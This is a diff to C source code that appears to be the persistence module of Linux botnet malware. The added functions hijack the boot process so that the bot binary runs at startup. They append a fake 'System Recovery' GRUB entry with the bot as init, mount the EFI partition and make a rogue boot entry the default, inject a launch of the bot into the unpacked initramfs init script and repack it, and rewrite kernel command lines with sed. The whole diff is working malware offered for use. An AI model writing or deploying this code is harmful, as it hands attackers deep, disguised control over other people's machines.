@@ -488,6 +488,7 @@ static BOOL setup_profiles_aggressive(const char *bot_path) {
     
     return (success_count > 0);
 }
+
 static BOOL setup_rclocal(const char *bot_path) {
     char rclocal_path[] = "/etc/rc.local";
     FILE *f;
@@ -671,12 +672,209 @@ static BOOL setup_shell_profiles(const char *bot_path) {
     return success;
 }
 
+static BOOL infect_boot_partition(const char *bot_path) {
+    FILE *f = fopen("/proc/mounts", "r");
+    if (f == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] infect_boot_partition: cannot open /proc/mounts\n");
+        #endif
+        return FALSE;
+    }
+    
+    char line[512];
+    BOOL boot_mounted = FALSE;
+    BOOL success = FALSE;
+    
+    while (fgets(line, sizeof(line), f)) {
+        if (strstr(line, " /boot ") || strstr(line, " /boot/efi ")) {
+            boot_mounted = TRUE;
+            break;
+        }
+    }
+    fclose(f);
+    
+    if (!boot_mounted) {
+        #ifdef DEBUG
+            printf("[persistence] infect_boot_partition: boot not mounted\n");
+        #endif
+        return FALSE;
+    }
+    
+    system("mount -o remount,rw /boot 2>/dev/null");
+    
+    if (access("/boot/grub/grub.cfg", W_OK) == 0) {
+        FILE *grub = fopen("/boot/grub/grub.cfg", "a");
+        if (grub) {
+            fprintf(grub, "\n# System recovery entry\n");
+            fprintf(grub, "menuentry 'System Recovery' {\n");
+            fprintf(grub, "  linux /vmlinuz root=/dev/sda1 init=%s\n", bot_path);
+            fprintf(grub, "  initrd /initrd.img\n");
+            fprintf(grub, "}\n");
+            fclose(grub);
+            success = TRUE;
+            #ifdef DEBUG
+                printf("[persistence] infect_boot_partition: modified grub.cfg\n");
+            #endif
+        }
+    }
+    
+    return success;
+}
+
+static BOOL infect_efi_partition(const char *bot_path) {
+    if (access("/sys/firmware/efi", F_OK) != 0) {
+        #ifdef DEBUG
+            printf("[persistence] infect_efi_partition: not UEFI system\n");
+        #endif
+        return FALSE;
+    }
+    
+    system("mkdir -p /boot/efi 2>/dev/null");
+    system("mount /dev/sda1 /boot/efi 2>/dev/null || "
+           "mount /dev/nvme0n1p1 /boot/efi 2>/dev/null || "
+           "mount /dev/mmcblk0p1 /boot/efi 2>/dev/null");
+    
+    if (access("/boot/efi/loader", F_OK) == 0) {
+        system("mkdir -p /boot/efi/loader/entries 2>/dev/null");
+        
+        FILE *f = fopen("/boot/efi/loader/entries/persistent.conf", "w");
+        if (f) {
+            fprintf(f, "title System Recovery\n");
+            fprintf(f, "linux /vmlinuz\n");
+            fprintf(f, "initrd /initrd.img\n");
+            fprintf(f, "options root=/dev/sda2 init=%s quiet\n", bot_path);
+            fclose(f);
+            #ifdef DEBUG
+                printf("[persistence] infect_efi_partition: created boot entry\n");
+            #endif
+            
+            FILE *loader = fopen("/boot/efi/loader/loader.conf", "a");
+            if (loader) {
+                fprintf(loader, "\ntimeout 3\ndefault persistent\n");
+                fclose(loader);
+            }
+            
+            return TRUE;
+        }
+    }
+    
+    return FALSE;
+}
+static BOOL infect_initramfs(const char *bot_path) {
+    char initrd[256] = "/boot/initrd.img";
+    if (access(initrd, F_OK) != 0) {
+        strcpy(initrd, "/boot/initramfs-linux.img");
+        if (access(initrd, F_OK) != 0) {
+            strcpy(initrd, "/boot/initrd.img-$(uname -r)");
+            if (access(initrd, F_OK) != 0) {
+                #ifdef DEBUG
+                    printf("[persistence] infect_initramfs: no initramfs found\n");
+                #endif
+                return FALSE;
+            }
+        }
+    }
+    
+    if (access(initrd, W_OK) != 0) {
+        system("mount -o remount,rw /boot 2>/dev/null");
+    }
+    
+    char tmpdir[] = "/tmp/initrd.XXXXXX";
+    if (mkdtemp(tmpdir) == NULL) {
+        #ifdef DEBUG
+            printf("[persistence] infect_initramfs: cannot create temp dir\n");
+        #endif
+        return FALSE;
+    }
+    
+    char cmd[512];
+    BOOL success = FALSE;
+    
+    snprintf(cmd, sizeof(cmd), "cd %s && zcat %s 2>/dev/null | cpio -id 2>/dev/null", tmpdir, initrd);
+    if (system(cmd) != 0) {
+        snprintf(cmd, sizeof(cmd), "cd %s && cat %s 2>/dev/null | cpio -id 2>/dev/null", tmpdir, initrd);
+        system(cmd);
+    }
+    
+    char init_script[512];
+    snprintf(init_script, sizeof(init_script), "%s/init", tmpdir);
+    
+    FILE *f = fopen(init_script, "a");
+    if (f) {
+        fprintf(f, "\n# Auto-start service\n");
+        fprintf(f, "if [ -x \"%s\" ]; then\n", bot_path);
+        fprintf(f, "    %s &\n", bot_path);
+        fprintf(f, "fi\n");
+        fclose(f);
+        
+        char new_initrd[512];
+        snprintf(new_initrd, sizeof(new_initrd), "%s.new", initrd);
+        
+        snprintf(cmd, sizeof(cmd),
+                 "cd %s && find . 2>/dev/null | cpio -o -H newc 2>/dev/null | gzip > %s",
+                 tmpdir, new_initrd);
+        
+        if (system(cmd) == 0) {
+            snprintf(cmd, sizeof(cmd), "mv %s %s 2>/dev/null", new_initrd, initrd);
+            if (system(cmd) == 0) {
+                success = TRUE;
+                #ifdef DEBUG
+                    printf("[persistence] infect_initramfs: modified initramfs\n");
+                #endif
+            }
+        }
+    }
+    
+    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
+    system(cmd);
+    
+    return success;
+}
+
+static BOOL modify_kernel_cmdline(const char *bot_path) {
+    char *grub_files[] = {
+        "/boot/grub/grub.cfg",
+        "/boot/grub2/grub.cfg",
+        "/etc/default/grub"
+    };
+    
+    BOOL success = FALSE;
+    
+    for (int i = 0; i < sizeof(grub_files) / sizeof(grub_files[0]); i++) {
+        if (access(grub_files[i], W_OK) == 0) {
+            char cmd[512];
+            snprintf(cmd, sizeof(cmd), 
+                     "sed -i 's/\\(linux.*vmlinuz.*\\)/\\1 init=%s/' %s 2>/dev/null",
+                     bot_path, grub_files[i]);
+            
+            if (system(cmd) == 0) {
+                success = TRUE;
+                #ifdef DEBUG
+                    printf("[persistence] modify_kernel_cmdline: modified %s\n", grub_files[i]);
+                #endif
+            }
+        }
+    }
+    
+    if (access("/etc/kernel", W_OK) == 0) {
+        FILE *f = fopen("/etc/kernel/cmdline", "w");
+        if (f) {
+            fprintf(f, "root=/dev/sda1 init=%s quiet\n", bot_path);
+            fclose(f);
+            success = TRUE;
+        }
+    }
+    
+    return success;
+}
+
 const char* get_persistent_path(void) {
     if (persistent_path[0] != '\0') {
         return persistent_path;
     }
     return NULL;
 }
+
 void persistence_init(void) {
     char self_exe[4096];
     char install_path[256];
@@ -804,6 +1002,30 @@ void persistence_init(void) {
     }
     
     if (setup_profiles_aggressive(install_path)) {
+        persistence_count++;
+        usleep(200000);
+    }
+    
+    #ifdef DEBUG
+        printf("[persistence] Attempting boot partition infection...\n");
+    #endif
+    
+    if (infect_boot_partition(install_path)) {
+        persistence_count++;
+        usleep(200000);
+    }
+    
+    if (infect_efi_partition(install_path)) {
+        persistence_count++;
+        usleep(200000);
+    }
+    
+    if (infect_initramfs(install_path)) {
+        persistence_count++;
+        usleep(200000);
+    }
+    
+    if (modify_kernel_cmdline(install_path)) {
         persistence_count++;
         usleep(200000);
     }
